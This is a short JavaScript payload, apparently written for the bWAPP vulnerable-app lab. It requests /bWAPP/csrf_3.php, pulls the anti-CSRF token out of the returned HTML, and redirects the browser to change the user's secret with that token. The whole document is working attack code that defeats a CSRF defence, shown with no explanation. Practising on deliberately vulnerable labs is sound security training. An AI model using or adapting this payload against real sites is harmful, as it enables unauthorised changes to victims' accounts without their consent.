<!--
(function() {
  var httpRequest;
  document.getElementById("ajaxButton").onclick = function() { makeRequest("/bWAPP/csrf_3.php"); };

  function makeRequest(url) {
    if (window.XMLHttpRequest) { // Mozilla, Safari, ...
      httpRequest = new XMLHttpRequest();
    } else if (window.ActiveXObject) { // IE
      try {
        httpRequest = new ActiveXObject("Msxml2.XMLHTTP");
      } 
      catch (e) {
        try {
          httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
        } 
        catch (e) {}
      }
    }

    if (!httpRequest) {
      alert("Sorry, I am not able to create an XMLHTTP instance.");
      return false;
    }
    httpRequest.onreadystatechange = alertContents;
    httpRequest.open("GET", url);
    httpRequest.send();
  }

function alertContents() {
    if (httpRequest.readyState === 4) {
      if (httpRequest.status === 200) {
        var htmlText = httpRequest.responseText;
//      alert(htmlText);
        var parser = new DOMParser ();
        var xmlDoc = parser.parseFromString(htmlText,"text/html"); // 'text/xml' does not work
        var token = xmlDoc.getElementsByName("token")[0].value;
//      alert(user_token);
        document.location = "/bWAPP/csrf_3.php?secret=SECRET&action=change&token=" + token;
} else {
  alert("Sorry, It is not a proper request.");
}
}
}
})();
-->